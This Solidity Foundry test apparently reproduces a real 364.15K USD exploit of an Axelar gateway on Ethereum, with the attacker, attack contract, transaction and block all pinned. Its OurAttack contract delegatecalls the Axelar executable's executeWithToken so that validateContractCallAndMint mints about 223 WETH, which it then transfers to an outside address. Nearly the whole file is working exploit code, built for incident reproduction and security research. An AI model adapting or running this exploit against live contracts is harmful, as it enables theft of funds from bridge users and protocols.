// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 364.15K USD
// Attacker : 0x8dbee8f3917049bc30fef01924a7ac79d16cf2b9
// Attack Contract : 0xb773bcc5b325ad9ac6b36e1a046ad4466833a16e
// Vulnerable Contract : 0xb773bcc5b325ad9ac6b36e1a046ad4466833a16e
// Attack Tx : 0x3513509c71bc8e02695fad55e136b8f21933f6a4433f4dafe471800d98ca8e05
// Block : 25289192
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : beneficial_payout_reproduction
// Reproduced Value : 364.15K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.ERC1967Proxy;
    uint256 constant FORK_BLOCK = 25289191;
    uint256 constant TX_TIMESTAMP = 1781120387;
    uint256 constant TX_BLOCK_NUMBER = 25289192;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _etchAttackRuntime();
        OurAttack attack = OurAttack(payable(ATTACK_CONTRACT));
        _prepareProfit(address(attack), address(0));
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_6C2EAB_3976, address(0), Addresses.WETH, "WETH", 223366721790776578348);
    }
}

contract OurAttack {
    bytes32 internal constant COMMAND_ID = 0xb9dcbe123645851f74c3fedff37c99e41a1cd36f08489795b69d0fee7153ecce;
    bytes32 internal constant PAYLOAD_HASH = 0x8b02ebd7c7cb2bf4feebf97bc864955c3bd2fba36b04a5f56c7a37d7659587d4;
    string internal constant SOURCE_CHAIN = "osmosis";
    string internal constant SOURCE_ADDRESS = "osmo1t26dt2vm9ve2r0mwdau62qfg68dgjhpmk6ldmj";
    string internal constant TOKEN_SYMBOL = "WETH";
    uint256 internal constant MINT_AMOUNT = 223366721790776578348;

    function attack() external payable {
        bytes memory axelarPayload =
            hex"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000200000000000000000000000006c2eab82ba2897a6e99fb6af018020da15123976";
        bytes memory mintCall = abi.encodeWithSelector(
            IAxelarExecutable.executeWithToken.selector,
            COMMAND_ID,
            SOURCE_CHAIN,
            SOURCE_ADDRESS,
            axelarPayload,
            TOKEN_SYMBOL,
            MINT_AMOUNT
        );
        (bool ok,) = Addresses.axelarExecutable.delegatecall(mintCall);
        require(ok, "Axelar delegatecall failed");
    }

    receive() external payable {}

    function executeWithToken(
        bytes32 commandId,
        string calldata sourceChain,
        string calldata sourceAddress,
        bytes calldata axelarPayload,
        string calldata tokenSymbol,
        uint256 amount
    ) external payable {
        require(commandId == COMMAND_ID, "unexpected command");
        require(keccak256(bytes(sourceChain)) == keccak256(bytes(SOURCE_CHAIN)), "unexpected source chain");
        require(keccak256(bytes(sourceAddress)) == keccak256(bytes(SOURCE_ADDRESS)), "unexpected source address");
        require(keccak256(axelarPayload) == PAYLOAD_HASH, "unexpected payload");
        require(keccak256(bytes(tokenSymbol)) == keccak256(bytes(TOKEN_SYMBOL)), "unexpected token");
        require(amount == MINT_AMOUNT, "unexpected amount");
        _delegateAxelarMint();
    }

    function _delegateAxelarMint() internal {
        IAxelarGatewayProxyMultisig(Addresses.AxelarGatewayProxyMultisig)
            .validateContractCallAndMint(
                COMMAND_ID, SOURCE_CHAIN, SOURCE_ADDRESS, PAYLOAD_HASH, TOKEN_SYMBOL, MINT_AMOUNT
            );
        IAxelarGatewayProxyMultisig(Addresses.AxelarGatewayProxyMultisig).tokenAddresses(TOKEN_SYMBOL);
        IERC20Like(Addresses.WETH).transfer(Addresses.A_6C2EAB_3976, MINT_AMOUNT);
        bytes memory ret = hex"";
        assembly {
            return(add(ret, 32), mload(ret))
        }
    }

    fallback() external payable {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant AxelarGatewayProxyMultisig = 0x4F4495243837681061C4743b74B3eEdf548D56A5;
    address internal constant A_6C2EAB_3976 = 0x6c2eAb82Ba2897A6e99fB6aF018020da15123976;
    address internal constant attacker_eoa = 0x8dBEE8F3917049Bc30fEF01924A7AC79d16Cf2b9;
    address internal constant ERC1967Proxy = 0xB773bCc5B325ad9AC6B36e1A046AD4466833A16E;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant axelarExecutable = 0xEF1cE4489962E6d6D6BE8066E160B2799610cB85;
}

interface IAxelarExecutable {
    function executeWithToken(
        bytes32 commandId,
        string calldata sourceChain,
        string calldata sourceAddress,
        bytes calldata payload,
        string calldata tokenSymbol,
        uint256 amount
    ) external;
}

interface IAxelarGatewayProxyMultisig {
    function tokenAddresses(string calldata symbol) external view returns (address);
    function validateContractCallAndMint(
        bytes32 commandId,
        string calldata sourceChain,
        string calldata sourceAddress,
        bytes32 payloadHash,
        string calldata tokenSymbol,
        uint256 amount
    ) external returns (bool);
}
